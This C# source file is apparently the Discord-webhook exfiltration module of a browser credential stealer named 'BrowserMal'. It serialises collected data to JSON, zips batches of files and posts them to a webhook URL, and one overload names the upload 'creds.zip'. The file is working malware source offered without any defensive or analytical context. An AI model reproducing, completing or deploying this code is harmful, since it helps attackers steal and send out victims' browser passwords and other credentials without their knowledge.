using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace BrowserMal.Discord
{
    internal class Webhook
    {
        public static void SendFile<T>(List<T> list, string filename, string url)
        {
            string json = JsonConvert.SerializeObject(list, Formatting.Indented);
            var file_bytes = Encoding.UTF8.GetBytes(json);

            GenericSender(file_bytes, filename, url);
        }

        private static void GenericSender(byte[] file, string filename, string url)
        {
            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent
                    {
                        { new ByteArrayContent(file, 0, file.Length), "Document", filename }
                    };
                    
                    HttpResponseMessage response = httpClient.PostAsync(url, form).GetAwaiter().GetResult();
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }

        public static void Send(string message, string url)
        {
            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    StringContent stringContent = new StringContent(message, Encoding.UTF8, "application/json");
                    HttpResponseMessage response = httpClient.PostAsync(url, stringContent).GetAwaiter().GetResult();
                }
            }
            catch { }
        }

        public static void SendFile(byte[] file, string url, string fileName) => GenericSender(file, fileName, url);

        public static void SendFile(byte[] file, string url) => GenericSender(file, "creds.zip", url);

        public static void BulkSend(Dictionary<string, string> files, string url) => SendFile(Util.Zip.ZipArchives(files), url);
    }
}
